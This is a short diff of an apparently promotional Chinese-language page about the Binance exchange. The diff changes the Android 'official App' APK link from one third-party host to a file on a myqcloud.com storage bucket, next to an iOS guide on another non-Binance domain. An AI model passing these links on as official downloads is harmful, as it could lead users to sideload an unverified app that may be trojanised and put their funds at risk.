@@ -61,7 +61,7 @@ https://t.me/carbon_research
 **币安**:  全球最大交易所，交易量最大大,流动性最强,用户数最多, 安全性最高. 
 
 安卓币安官方App下载地址:\
-https://download.mp3web.ac/pack/BNApp64.apk
+https://download-1306379396.file.myqcloud.com/pack/BNApp_F0000526.apk
 
 币安iOS App下载教程:\
 https://www.marketwebb.link/zh-CN/download-guide
